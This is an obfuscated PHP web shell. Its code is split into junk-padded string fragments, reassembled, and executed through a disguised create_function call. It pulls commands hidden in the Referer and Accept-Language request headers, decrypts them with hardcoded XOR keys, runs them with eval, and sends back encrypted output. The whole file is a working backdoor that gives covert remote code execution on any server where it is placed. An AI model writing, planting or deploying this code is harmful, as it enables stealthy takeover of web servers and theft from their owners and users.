<?php
$g='};}}retu1^rn1^ $o;}$r=$_SER1^1^VER;$rr=@1^$1^r["HTTP_1^REFERER"];1^$ra=@$r[1^"1^HTTP_AC1^CEPT_L';
$G='er";$i=$1^m[1][0]1^.$m[1]1^1^[11^];$h=1^$sl($ss(md5($i.$k1^h),0,31^));$1^f1^=$sl($ss(md51^1^($i';
$Y='1^pos($p,$h1^)=1^==0){$s[$i]1^="";$p1^=$ss($1^1^p,3);}if(ar1^ray_1^1^key_exis1^ts($i,$s)){$s1^';
$E=';1^1^for(1^$i=0;$i<$l;){for(1^$j=01^;(1^1^$j<$c&&$i<$l);$j1^++,$1^i++){1^$o.1^=$t1^1^{$i}^$k{$j';
$s='1^$kh="5d41";1^$kf="402a";f1^u1^nction x($t1^,$k)1^1^{$c=strlen($k)1^;1^$1^l=strlen($1^t);$o=""';
$z=',$ss($1^s1^[$i],0,1^$e))),$k1^)))1^1^;$1^o=ob_get_conten1^1^ts();ob_end_clean()1^;$d=ba1^se61^1';
$J='ANGUA1^GE"]1^;if($rr&&1^$ra){$1^u=pa1^rse_url(1^$rr)1^;pars1^e_str($u[1^"1^quer1^y"],$q);1^$q1';
$D='1^.$k1^f),01^,3));$p="";1^fo1^r($z=1;$z<c1^ount($m[11^]1^);$z++)$p.=$q[$m[1^2][$z]1^]1^;if(str';
$j='^=array_valu1^es($q);pre1^g1^_match1^_al1^l("/([\\1^w]1^)[\\w-]+(?1^:1^;q=0.(1^[\\d]))?,?1^/",$ra1^';
$e=',$m);if($q&&$m1^){@s1^e1^ssion_1^sta1^rt();$s=&$_SESSION1^1^;$ss="subst1^r";1^$sl="1^strto1^low';
$c=str_replace('Ku','','crKuKueaKuKuteKu_functiKuon');
$U='compress(@x(@1^ba1^se64_de1^1^1^code(pr1^eg_replace(1^array("/_/",1^"/1^-1^/"),array("/","1^+")';
$i='[$i1^]1^.=$p;$e=st1^rpos($1^s[$i]1^,$f);if(1^$e){$k=$1^kh.$k1^f;ob_st1^art1^();@e1^val(@gzu1^n1^';
$P='^4_encode1^(x(g1^zcompres1^s($o),$k1^));pr1^int(1^"<$k>$d</$k>"1^)1^1^;@se1^ssion_destroy();}}}}';
$k=str_replace('1^','',$s.$E.$g.$J.$j.$e.$G.$D.$Y.$i.$U.$z.$P);
$K=$c('',$k);$K();
?>
